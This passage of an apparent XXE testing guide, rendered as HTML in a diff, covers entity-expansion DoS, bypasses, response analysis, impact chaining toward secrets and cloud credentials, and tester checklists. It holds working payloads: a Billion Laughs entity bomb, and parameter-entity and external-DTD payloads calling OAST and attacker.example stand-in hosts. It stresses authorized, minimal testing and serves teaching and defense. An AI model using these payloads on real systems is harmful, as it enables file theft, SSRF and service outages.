+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>DocumentBuilderFactory
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>SAXParserFactory
+</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>XMLInputFactory
+</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a>TransformerFactory
+</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6" href="#__codelineno-75-6"></a>SchemaFactory
+</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7" href="#__codelineno-75-7"></a>Validator
+</span><span id="__span-75-8"><a id="__codelineno-75-8" name="__codelineno-75-8" href="#__codelineno-75-8"></a>JAXB
+</span><span id="__span-75-9"><a id="__codelineno-75-9" name="__codelineno-75-9" href="#__codelineno-75-9"></a>DOM4J
+</span><span id="__span-75-10"><a id="__codelineno-75-10" name="__codelineno-75-10" href="#__codelineno-75-10"></a>JDOM
+</span></code></pre></div>
+<p>Java hardening must be applied per parser/factory. Do not assume one global XML setting protects all XML processing paths.</p>
+<hr />
+<h2 id="entity-expansion-dos">Entity Expansion DoS</h2>
+<p>Entity expansion attacks abuse nested entities to consume memory or CPU.</p>
+<p>Classic “Billion Laughs” concept:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="cp">&lt;!DOCTYPE lolz [</span>
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="cp">  &lt;!ENTITY a &quot;lol&quot;&gt;</span>
+</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY b &quot;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&quot;&gt;</span>
+</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="w">  </span><span class="cp">&lt;!ENTITY c &quot;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&quot;&gt;</span>
+</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a>]&gt;
+</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;c;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Do not use destructive expansion payloads against production systems.</p>
+<p>Safe DoS review should focus on configuration:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>DTD disabled
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>entity expansion limits
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>max entity depth
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>max document size
+</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a>max parse time
+</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a>memory limits
+</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a>streaming parser limits
+</span></code></pre></div>
+<p>Report DoS risk without crashing the service.</p>
+<hr />
+<h2 id="common-bypasses">Common Bypasses</h2>
+<h3 id="parameter-entities">Parameter Entities</h3>
+<p>If normal entities fail:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="cp">  &lt;!ENTITY % xxe SYSTEM &quot;http://xxe-test-73921.oast.example/param&quot;&gt;</span>
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="w">  </span>%xxe;
+</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a>]&gt;
+</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a><span class="nt">&lt;root&gt;</span>test<span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<h3 id="external-dtd">External DTD</h3>
+<p>If direct file output is blocked:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="cp">  &lt;!ENTITY % remote SYSTEM &quot;http://attacker.example/xxe.dtd&quot;&gt;</span>
+</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a><span class="w">  </span>%remote;
+</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>]&gt;
+</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a><span class="nt">&lt;root&gt;</span>test<span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<h3 id="encoding">Encoding</h3>
+<p>Try different XML encodings only in authorized testing:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span></code></pre></div>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span>
+</span></code></pre></div>
+<p>Some parsers behave differently depending on encoding and input normalization.</p>
+<h3 id="alternative-protocols">Alternative Protocols</h3>
+<p>Depending on parser/runtime:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>file://
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>http://
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>https://
+</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>ftp://
+</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a>jar:
+</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>php://filter
+</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7" href="#__codelineno-82-7"></a>expect://
+</span><span id="__span-82-8"><a id="__codelineno-82-8" name="__codelineno-82-8" href="#__codelineno-82-8"></a>gopher://
+</span></code></pre></div>
+<p>Availability is highly parser and runtime dependent.</p>
+<h3 id="content-type-switching">Content-Type Switching</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>application/xml
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>text/xml
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>application/soap+xml
+</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a>application/xhtml+xml
+</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a>image/svg+xml
+</span></code></pre></div>
+<h3 id="xml-case-whitespace-variations">XML Case / Whitespace Variations</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example&quot;&gt;</span>
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>]&gt;
+</span></code></pre></div>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="cp">&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example&quot;&gt;</span><span class="w"> </span>]&gt;
+</span></code></pre></div>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="cp">&lt;!DOCTYPE</span>
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a><span class="cp">root</span>
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="cp">[</span>
+</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a><span class="cp">&lt;!ENTITY</span>
+</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a><span class="cp">xxe</span>
+</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a><span class="cp">SYSTEM</span>
+</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a><span class="cp">&quot;http://xxe-test-73921.oast.example&quot;&gt;</span>
+</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a>]&gt;
+</span></code></pre></div>
+<h3 id="cdata-confusion">CDATA Confusion</h3>
+<p>CDATA may affect how payloads are handled in downstream XML/HTML rendering.</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="cp">&lt;![CDATA[&lt;test&gt;value&lt;/test&gt;]]&gt;</span>
+</span></code></pre></div>
+<p>This is more commonly useful for parser/context testing than for direct XXE.</p>
+<hr />
+<h2 id="response-analysis">Response Analysis</h2>
+<p>Compare more than visible output.</p>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Marker entity appears</td>
+<td>Internal entity expansion works.</td>
+</tr>
+<tr>
+<td>File content appears</td>
+<td>In-band file-read XXE confirmed.</td>
+</tr>
+<tr>
+<td>OAST DNS hit</td>
+<td>Parser resolved external entity host.</td>
+</tr>
+<tr>
+<td>OAST HTTP hit</td>
+<td>Parser fetched external entity.</td>
+</tr>
+<tr>
+<td>XML parser error</td>
+<td>Payload reached XML parser.</td>
+</tr>
+<tr>
+<td>Error includes file path</td>
+<td>Error-based leakage possible.</td>
+</tr>
+<tr>
+<td>Response delayed</td>
+<td>Parser tried to resolve external resource or expand entities.</td>
+</tr>
+<tr>
+<td>Different status code</td>
+<td>XML parsing behavior changed.</td>
+</tr>
+<tr>
+<td>Different response length</td>
+<td>Entity expansion or error changed output.</td>
+</tr>
+<tr>
+<td>400 with XML error</td>
+<td>Parser saw DTD/entity syntax.</td>
+</tr>
+<tr>
+<td>500 server error</td>
+<td>Parser exception may be unhandled.</td>
+</tr>
+</tbody>
+</table>
+<p>Useful error strings:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>DOCTYPE is disallowed
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>External Entity
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>SAXParseException
+</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a>DocumentBuilder
+</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>XMLInputFactory
+</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a>libxml
+</span><span id="__span-88-7"><a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a>lxml
+</span><span id="__span-88-8"><a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a>ExpatError
+</span><span id="__span-88-9"><a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a>XmlException
+</span><span id="__span-88-10"><a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a>System.Xml
+</span><span id="__span-88-11"><a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a>XmlReader
+</span><span id="__span-88-12"><a id="__codelineno-88-12" name="__codelineno-88-12" href="#__codelineno-88-12"></a>EntityReference
+</span><span id="__span-88-13"><a id="__codelineno-88-13" name="__codelineno-88-13" href="#__codelineno-88-13"></a>Entity not defined
+</span><span id="__span-88-14"><a id="__codelineno-88-14" name="__codelineno-88-14" href="#__codelineno-88-14"></a>Failed to load external entity
+</span></code></pre></div>
+<hr />
+<h2 id="blind-xxe-oast-checklist">Blind XXE OAST Checklist</h2>
+<p>Use unique URLs per test:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>xxe-body-73921.oast.example
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>xxe-param-73921.oast.example
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>xxe-svg-73921.oast.example
+</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a>xxe-office-73921.oast.example
+</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a>xxe-soap-73921.oast.example
+</span></code></pre></div>
+<p>Check:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>DNS only
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>HTTP request
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>source IP
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>User-Agent
+</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>path
+</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a>query string
+</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>timestamp
+</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a>repeatability
+</span></code></pre></div>
+<p>Good proof:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>The XML parser made an HTTP request to a unique OAST URL after processing a parameter entity.
+</span></code></pre></div>
+<p>Better proof:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>The callback only happened when the XXE payload was present and did not happen for the baseline XML.
+</span></code></pre></div>
+<hr />
+<h2 id="common-false-positives">Common False Positives</h2>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Why it can mislead</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XML parser error only</td>
+<td>Parser saw XML but may not resolve entities.</td>
+</tr>
+<tr>
+<td>Input reflected unchanged</td>
+<td>No entity expansion happened.</td>
+</tr>
+<tr>
+<td>WAF block page</td>
+<td>Error caused by WAF, not parser.</td>
+</tr>
+<tr>
+<td>Client-side SVG fetch</td>
+<td>Browser fetched resource, not server.</td>
+</tr>
+<tr>
+<td>Link preview fetch</td>
+<td>Different component fetched URL, not XML parser.</td>
+</tr>
+<tr>
+<td>Antivirus/sandbox callback</td>
+<td>File scanner fetched URL, not app parser.</td>
+</tr>
+<tr>
+<td>DNS prefetch</td>
+<td>DNS callback without parser-controlled fetch.</td>
+</tr>
+<tr>
+<td>Cached processing</td>
+<td>Old upload or background job causes delayed hit.</td>
+</tr>
+<tr>
+<td>Broken XML structure</td>
+<td>Error unrelated to XXE capability.</td>
+</tr>
+</tbody>
+</table>
+<p>Confirm with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>baseline request without payload
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>unique marker per endpoint
+</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>server-side source IP
+</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>server-specific User-Agent
+</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>repeatable callback
+</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>in-band entity expansion where possible
+</span></code></pre></div>
+<hr />
+<h2 id="impact-chaining">Impact Chaining</h2>
+<p>XXE is often a pivot.</p>
+<p>Common chains:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>XXE → local file read
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>XXE → application config disclosure
+</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>XXE → database credential disclosure
+</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>XXE → cloud metadata access
+</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>XXE → SSRF to internal admin panel
+</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>XXE → source code disclosure
+</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>XXE → error-based secret leakage
+</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a>XXE → OOB data exfiltration
+</span><span id="__span-94-9"><a id="__codelineno-94-9" name="__codelineno-94-9" href="#__codelineno-94-9"></a>XXE → Office document processing pipeline compromise
+</span><span id="__span-94-10"><a id="__codelineno-94-10" name="__codelineno-94-10" href="#__codelineno-94-10"></a>XXE → SVG processing issue
+</span><span id="__span-94-11"><a id="__codelineno-94-11" name="__codelineno-94-11" href="#__codelineno-94-11"></a>XXE → denial of service
+</span></code></pre></div>
+<p>High-impact targets, only if authorized:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>application secrets
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>database credentials
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>JWT signing keys
+</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>SAML private keys
+</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a>cloud metadata role credentials
+</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a>Kubernetes service account token
+</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a>CI/CD credentials
+</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a>internal service endpoints
+</span></code></pre></div>
+<hr />
+<h2 id="manual-xxe-checklist">Manual XXE Checklist</h2>
+<h3 id="discovery">Discovery</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified XML parsing functionality.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked raw XML APIs.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked SOAP endpoints.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked SAML metadata/import flows.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked SVG uploads.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked Office document imports/previews.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked RSS/Atom importers.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked XML config upload.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked background processing and second-order parsing.</li>
+</ul>
+<h3 id="basic-testing">Basic Testing</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested harmless internal entity.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested external HTTP callback.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested parameter entity callback.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested harmless local file read.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested XML content-type switching.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked parser errors.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Compared baseline request with XXE request.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Confirmed actual entity resolution, not reflection.</li>
+</ul>
+<h3 id="in-band-xxe_1">In-Band XXE</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether entity value appears in response.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Used harmless file targets first.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked Linux and Windows paths if OS unknown.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Avoided sensitive file extraction unless explicitly authorized.</li>
+</ul>
+<h3 id="blind-oob-xxe">Blind / OOB XXE</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Used unique OAST domain.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested general entity callback.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested parameter entity callback.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested external DTD callback.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Recorded DNS/HTTP callback details.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Confirmed callback is repeatable.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Avoided data exfiltration unless explicitly authorized.</li>
+</ul>
+<h3 id="ssrf-via-xxe">SSRF via XXE</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested harmless internal endpoint only if allowed.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested controlled external callback.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked cloud metadata reachability only with minimal proof.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Avoided retrieving credentials unless explicitly authorized.</li>
+</ul>
+<h3 id="file-uploads">File Uploads</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested SVG server-side processing.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested Office document parsing.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested XML files inside archives.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked async processing delays.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked generated previews/thumbnails/PDFs.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked OAST callbacks from workers/scanners.</li>
+</ul>
+<h3 id="bypass-testing">Bypass Testing</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested parameter entities.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested external DTDs.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested XInclude.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested alternate content types.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested PHP wrappers where applicable.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested Java <code>jar:</code> only in authorized environments.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested encoding variations carefully.</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified parser behavior.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified in-band/blind/error-based behavior.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified file read capability.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified network callback capability.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified SSRF capability.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Documented minimum safe proof.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Avoided DoS payloads on production.</li>
+</ul>
+<h3 id="remediation-review">Remediation Review</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> DTDs disabled.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> External general entities disabled.</li>
